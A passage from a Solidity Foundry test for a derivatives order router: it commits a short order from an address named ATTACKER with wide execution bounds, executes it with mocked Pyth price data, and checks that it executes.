            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.SHORT,
            sizeDelta: SIZE,
            marginDelta: close ? 0 : 20_000e6,
            targetPrice: targetPrice,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ATTACKER);
        uint64 orderId = router.commitOrder(request);
        vm.prank(address(0xE0E));
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(PRICE));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

}
```

